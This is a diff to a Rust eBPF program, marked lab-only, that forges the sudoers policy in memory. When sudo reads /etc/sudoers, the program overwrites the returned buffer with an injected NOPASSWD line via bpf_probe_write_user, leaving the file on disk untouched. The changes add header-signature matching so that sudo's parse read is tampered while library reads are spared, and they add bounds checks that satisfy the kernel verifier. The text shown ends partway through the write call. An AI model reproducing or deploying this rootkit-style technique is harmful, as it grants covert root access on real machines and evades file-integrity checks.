@@ -1,19 +1,36 @@
 #![no_std]
 #![no_main]
-//! LAB-ONLY: when a process named "sudo" reads (its sudoers policy), overwrite
-//! the returned buffer with an injected line granting privileges. The file on
-//! disk is never touched. Uses the kernel-tainting bpf_probe_write_user.
+//! LAB-ONLY: forge the sudoers policy `sudo` parses. When a process named
+//! "sudo" read()s the header of `/etc/sudoers`, overwrite the buffer with an
+//! injected NOPASSWD line. The file on disk is never touched. Uses the
+//! kernel-tainting bpf_probe_write_user.
+//!
+//! Targeting is content-based, which turns out to be both simpler and more
+//! robust than tracking fds: we only tamper a read whose buffer *starts with
+//! the sudoers file header* (a signature the loader captures at startup). That
+//! matters for two reasons observed on a live box:
+//!   * sudo validates the file, then lseek()s back to 0 and re-reads it for the
+//!     actual parse. Both reads land at offset 0 and so both match the
+//!     signature — we tamper the parse read, not just the first one.
+//!   * Blindly overwriting every read() by "sudo" smashes the ELF headers the
+//!     loader read()s for shared libraries, bricking sudo before it parses any
+//!     policy. Library reads never match the sudoers header, so they're immune.
 
 use aya_ebpf::{
-    helpers::{bpf_get_current_comm, bpf_get_current_pid_tgid, generated::bpf_probe_write_user},
+    helpers::{
+        bpf_get_current_comm, bpf_get_current_pid_tgid, bpf_probe_read_user,
+        generated::bpf_probe_write_user,
+    },
     macros::{map, tracepoint},
     maps::{Array, HashMap},
     programs::TracePointContext,
 };
-use sudoadd_common::{Payload, ReadCtx};
+use sudoadd_common::{Payload, ReadCtx, Sig, SIG_LEN};
 
+// pid_tgid -> the in-flight read (buf/count captured at entry).
 #[map] static READS: HashMap<u64, ReadCtx> = HashMap::with_max_entries(1024, 0);
 #[map] static PAYLOAD: Array<Payload> = Array::with_max_entries(1, 0);
+#[map] static SIG: Array<Sig> = Array::with_max_entries(1, 0);
 #[map] static TAMPERS: HashMap<u32, u64> = HashMap::with_max_entries(1, 0);
 
 #[inline(always)]
@@ -59,12 +76,32 @@ fn on_exit(ctx: &TracePointContext) -> Result<(), ()> {
     let key = bpf_get_current_pid_tgid();
     let rc = *unsafe { READS.get(&key) }.ok_or(())?;
     let _ = READS.remove(&key);
-    if ret <= 0 {
-        return Ok(());
+    if ret < SIG_LEN as i64 {
+        return Ok(()); // too short to be the file header
     }
 
-    let p = unsafe { PAYLOAD.get(0) }.ok_or(())?;
-    let len = if p.len > 64 { 64 } else { p.len }; // bound the write
+    // Is this the sudoers header? Compare the buffer's first SIG_LEN bytes to
+    // the signature the loader captured from /etc/sudoers.
+    let sig = SIG.get(0).ok_or(())?;
+    let head = unsafe { bpf_probe_read_user::<[u8; SIG_LEN]>(rc.buf as *const [u8; SIG_LEN]) }
+        .map_err(|_| ())?;
+    let mut i = 0;
+    while i < SIG_LEN {
+        if head[i] != sig.bytes[i] {
+            return Ok(()); // not the sudoers header — leave it alone
+        }
+        i += 1;
+    }
+
+    let p = PAYLOAD.get(0).ok_or(())?;
+    // Clamp to 1..=64. The *lower* bound is load-bearing on modern kernels:
+    // bpf_probe_write_user's size is ARG_CONST_SIZE (not _OR_ZERO), so the
+    // verifier rejects any size it can't prove is non-zero ("R3 invalid
+    // zero-sized read"). p.len comes from a map, range [0, u32::MAX].
+    if p.len == 0 || p.len > 64 {
+        return Ok(());
+    }
+    let len = p.len; // verifier now knows len ∈ 1..=64
     if (ret as u64) >= len as u64 && rc.count >= len as u64 {
         unsafe {
             bpf_probe_write_user(
